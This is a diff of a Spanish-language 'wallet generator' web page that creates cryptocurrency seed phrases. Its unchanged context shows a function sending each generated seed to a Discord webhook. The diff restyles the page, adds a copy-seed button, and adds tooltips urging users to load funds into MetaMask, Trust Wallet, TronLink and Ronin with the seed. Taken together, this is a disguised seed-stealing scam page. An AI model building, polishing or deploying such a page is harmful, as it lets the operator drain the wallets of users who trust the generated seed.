@@ -4,27 +4,30 @@
   <title>Generador de Wallet</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #222;
+      color: #fff;
     }
 
     .container {
       max-width: 500px;
       margin: 0 auto;
       padding: 20px;
-      background-color: #fff;
+      background-color: rgba(0, 0, 0, 0.8);
       box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
       text-align: center;
     }
 
     h1 {
-      color: #333;
+      color: #fff;
       margin-bottom: 30px;
+      font-size: 28px;
     }
 
     p {
-      color: #666;
+      color: #ccc;
       margin-bottom: 20px;
+      line-height: 1.5;
     }
 
     button {
@@ -36,6 +39,11 @@
       font-size: 16px;
       cursor: pointer;
       margin-top: 20px;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #0056b3;
     }
 
     input[type="text"] {
@@ -49,6 +57,18 @@
       margin-bottom: 10px;
     }
 
+    .copy-icon {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      margin-left: 5px;
+      cursor: pointer;
+      vertical-align: middle;
+      background: url(copy_icon.png) no-repeat center center;
+      background-size: cover;
+      opacity: 0.6;
+    }
+
     .wallet-logos {
       display: flex;
       justify-content: space-around;
@@ -59,6 +79,12 @@
     .wallet-logo {
       width: 50px;
       height: 50px;
+      opacity: 0.7;
+      transition: opacity 0.3s;
+    }
+
+    .wallet-logo:hover {
+      opacity: 1;
     }
   </style>
   <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
@@ -97,21 +123,35 @@
           console.error('Error al enviar la semilla al webhook de Discord:', error);
         });
     }
+
+    function copySeed() {
+      const seedField = document.getElementById("seedField");
+      seedField.select();
+      seedField.setSelectionRange(0, 99999);
+      document.execCommand("copy");
+
+      const copyIcon = document.getElementById("copyIcon");
+      copyIcon.style.opacity = 1;
+      setTimeout(function () {
+        copyIcon.style.opacity = 0.6;
+      }, 1000);
+    }
   </script>
 </head>
 <body>
   <div class="container">
-    <h1>Generador de Wallet</h1>
-    <p>Bienvenido al Generador de Wallet. Haz clic en el botón "Generar Wallet" para crear una nueva billetera y obtener su semilla y dirección.</p>
+    <h1>Crea tu Wallet</h1>
+    <p>Genera una nueva billetera y obtén una semilla mnemotécnica única que puedes utilizar con diferentes wallets.</p>
     <button id="generateButton" onclick="generateWallet()">Generar Wallet</button>
     <input id="seedField" type="text" readonly>
+    <span class="copy-icon" id="copyIcon" onclick="copySeed()" title="Copiar semilla"></span>
     <input id="addressField" type="text" readonly>
 
     <div class="wallet-logos">
-      <img class="wallet-logo" src="metamask_logo.png" alt="Metamask">
-      <img class="wallet-logo" src="trustwallet_logo.png" alt="Trust Wallet">
-      <img class="wallet-logo" src="tronlink_logo.png" alt="TronLink">
-      <img class="wallet-logo" src="roninwallet_logo.png" alt="Ronin Wallet">
+      <img class="wallet-logo" src="metamask_logo.png" alt="Metamask" title="Metamask - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias.">
+      <img class="wallet-logo" src="trustwallet_logo.png" alt="Trust Wallet" title="Trust Wallet - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias.">
+      <img class="wallet-logo" src="tronlink_logo.png" alt="TronLink" title="TronLink - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias.">
+      <img class="wallet-logo" src="roninwallet_logo.png" alt="Ronin Wallet" title="Ronin Wallet - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias.">
     </div>
   </div>
 </body>
